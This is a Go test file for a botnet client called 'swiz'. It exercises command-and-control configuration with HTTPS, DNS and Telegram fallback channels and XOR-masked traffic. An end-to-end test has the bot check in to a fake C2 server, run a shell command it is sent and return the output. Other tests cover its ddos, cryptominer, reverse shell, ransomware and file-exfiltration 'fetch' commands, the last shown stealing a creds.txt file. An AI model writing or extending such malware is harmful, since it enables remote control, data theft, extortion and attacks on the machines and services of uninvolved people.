package main

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"
)

// --- config ------------------------------------------------------------

func TestLoadConfigDefaults(t *testing.T) {
	t.Setenv("SWIZ_C2_URLS", "")
	t.Setenv("SWIZ_DNS_DOMAIN", "")
	t.Setenv("SWIZ_TELEGRAM_TOKEN", "")
	t.Setenv("SWIZ_BOT_SECRET", "")
	t.Setenv("SWIZ_XOR", "")
	cfg := LoadConfig()
	if len(cfg.C2URLs) != 1 || cfg.C2URLs[0] != "https://127.0.0.1:8443" {
		t.Fatalf("default endpoints = %v", cfg.C2URLs)
	}
	if cfg.XOR != 0xAA {
		t.Fatalf("default xor = %#x", cfg.XOR)
	}
	if cfg.Interval != 30*time.Second {
		t.Fatalf("default interval = %s", cfg.Interval)
	}
}

func TestLoadConfigEnv(t *testing.T) {
	t.Setenv("SWIZ_C2_URLS", "https://a.example:8443, https://b.example:8443")
	t.Setenv("SWIZ_XOR", "0x42")
	t.Setenv("SWIZ_BOT_SECRET", "s3cret")
	t.Setenv("SWIZ_DNS_DOMAIN", "c2.example.org")
	cfg := LoadConfig()
	if len(cfg.C2URLs) != 2 || cfg.C2URLs[1] != "https://b.example:8443" {
		t.Fatalf("endpoints = %v", cfg.C2URLs)
	}
	if cfg.XOR != 0x42 {
		t.Fatalf("xor = %#x", cfg.XOR)
	}
	if cfg.BotSecret != "s3cret" || cfg.DNSDomain != "c2.example.org" {
		t.Fatalf("cfg = %+v", cfg)
	}
}

func TestXorMaskRoundTripBot(t *testing.T) {
	data := []byte(`{"bot_id":"x","output":"hello"}`)
	XorMask(data, 0x42)
	XorMask(data, 0x42)
	if string(data) != `{"bot_id":"x","output":"hello"}` {
		t.Fatal("xor not inverse")
	}
}

// --- full client round trip against a fake C2 ---------------------------

func TestCheckinExecResultE2E(t *testing.T) {
	var mu sync.Mutex
	var received []string
	cmdState := "idle"

	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/checkin":
			mu.Lock()
			state := cmdState
			mu.Unlock()
			if state == "idle" {
				w.Write([]byte(`{"id":"","type":"","payload":"","target":""}`))
				return
			}
			w.Write([]byte(`{"id":"cmd_1","type":"exec","payload":"echo swiz-e2e-ok","target":""}`))
		case "/result":
			body, _ := io.ReadAll(r.Body)
			XorMask(body, 0x42)
			mu.Lock()
			received = append(received, string(body))
			mu.Unlock()
			w.WriteHeader(http.StatusOK)
		}
	}))
	defer ts.Close()

	t.Setenv("SWIZ_C2_URLS", ts.URL)
	t.Setenv("SWIZ_XOR", "0x42")
	t.Setenv("SWIZ_BOT_SECRET", "")
	cfg := LoadConfig()
	cfgBotID = "testbot-e2e"
	cfg.XOR = 0x42

	client := NewC2Client(cfg)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// first checkin: idle
	cmd, _, err := client.Checkin(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if cmd == nil || !cmd.IsEmpty() {
		t.Fatalf("expected idle, got %+v", cmd)
	}

	// operator queues exec
	mu.Lock()
	cmdState = "exec"
	mu.Unlock()

	cmd, _, err = client.Checkin(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if cmd.Type != "exec" {
		t.Fatalf("expected exec, got %+v", cmd)
	}

	resp := executeCommand(*cmd)
	if resp.Status != "success" {
		t.Fatalf("exec failed: %+v", resp)
	}
	if !strings.Contains(resp.Output, "swiz-e2e-ok") {
		t.Fatalf("output = %q", resp.Output)
	}
	if err := client.SendResult(ctx, resp); err != nil {
		t.Fatal(err)
	}

	mu.Lock()
	defer mu.Unlock()
	if len(received) != 1 {
		t.Fatalf("received %d results", len(received))
	}
	var sent Response
	if err := json.Unmarshal([]byte(received[0]), &sent); err != nil {
		t.Fatal(err)
	}
	if sent.Status != "success" || !strings.Contains(sent.Output, "swiz-e2e-ok") {
		t.Fatalf("server got %+v", sent)
	}
}

// --- executeCommand error paths -----------------------------------------

func TestExecuteCommandErrors(t *testing.T) {
	cfgBotID = "tb"
	cases := []struct {
		typ, payload string
		wantErr      string
	}{
		{"ddos", "127.0.0.1", "host:port"},         // missing port
		{"ddos", "127.0.0.1:80 bogus", "method"},   // bad method
		{"miner", "", "usage"},                     // missing args
		{"shell", "127.0.0.1", "usage"},            // missing port
		{"shell", "127.0.0.1 notaport", "invalid"}, // bad port
		{"ransomware", "not-a-pem", "PEM"},
		{"bogus-type", "", "unknown command type"},
	}
	for _, c := range cases {
		resp := executeCommand(Command{ID: "x", Type: c.typ, Payload: c.payload})
		if resp.Status != "failed" {
			t.Errorf("%s %q: expected failed, got %+v", c.typ, c.payload, resp)
			continue
		}
		if !strings.Contains(resp.Output, c.wantErr) {
			t.Errorf("%s %q: output %q missing %q", c.typ, c.payload, resp.Output, c.wantErr)
		}
	}
}

func TestParseMinerSourceInThirdSlot(t *testing.T) {
	pool, wallet, threads, source, err := parseMiner("pool:3333 wal 2")
	if err != nil || pool != "pool:3333" || wallet != "wal" || threads != 2 || source != "" {
		t.Fatalf("parse = %q %q %d %q err=%v", pool, wallet, threads, source, err)
	}
	_, _, _, source, err = parseMiner("pool:3333 wal /opt/xmrig")
	if err != nil || source != "/opt/xmrig" {
		t.Fatalf("source parse: %q err=%v", source, err)
	}
}

// --- helpers for vectors ------------------------------------------------

func testSigner(t *testing.T) ssh.Signer {
	t.Helper()
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	signer, err := ssh.NewSignerFromKey(priv)
	if err != nil {
		t.Fatal(err)
	}
	return signer
}

func TestFetchCommand(t *testing.T) {
	cfgBotID = "tb"
	dir := t.TempDir()
	secret := "s3cr3t-file-content"
	path := dir + "/creds.txt"
	os.WriteFile(path, []byte(secret), 0o600)

	resp := executeCommand(Command{ID: "x", Type: "fetch", Payload: path})
	if resp.Status != "success" {
		t.Fatalf("fetch failed: %+v", resp)
	}
	decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(resp.Output))
	if err != nil {
		t.Fatalf("output not base64: %v", err)
	}
	if string(decoded) != secret {
		t.Fatalf("fetch round-trip mismatch: %q", decoded)
	}

	// missing file -> honest failure
	resp = executeCommand(Command{ID: "x", Type: "fetch", Payload: dir + "/nope.txt"})
	if resp.Status != "failed" || !strings.Contains(resp.Output, "fetch error") {
		t.Fatalf("expected honest fetch failure, got %+v", resp)
	}
	// no payload -> usage
	resp = executeCommand(Command{ID: "x", Type: "fetch"})
	if resp.Status != "failed" || !strings.Contains(resp.Output, "usage") {
		t.Fatalf("expected usage error, got %+v", resp)
	}
}

// --- transport frame codec (DNS/Telegram fallback channels) -------------

func TestFrameCodec(t *testing.T) {
	payload := []byte{0x00, 0x01, 0xfe, 0xff, 'a', 'b', 0x80}
	enc := encodeFrame(payload)
	if !strings.HasPrefix(enc, "swiz1:") {
		t.Fatalf("missing tag: %q", enc)
	}
	got, ok := decodeFrame(enc)
	if !ok {
		t.Fatal("decode failed")
	}
	if string(got) != string(payload) {
		t.Fatalf("roundtrip mismatch: %x != %x", got, payload)
	}
	// non-frame text must be ignored (e.g. an operator's chat chatter)
	if _, ok := decodeFrame("hello operator"); ok {
		t.Fatal("plain text must not decode as a frame")
	}
	if _, ok := decodeFrame("swiz1:!!!not-base64!!!"); ok {
		t.Fatal("bad base64 must not decode")
	}
}

func TestManagerLayerOrder(t *testing.T) {
	cfg := LoadConfig()
	cfg.DNSDomain = "c2.example.org"
	cfg.TGToken = "123:abc"
	c := NewC2Client(cfg)
	got := c.tr.Names()
	want := []string{"https", "dns", "telegram"}
	if len(got) != len(want) {
		t.Fatalf("layers = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("layer order = %v, want %v", got, want)
		}
	}
}
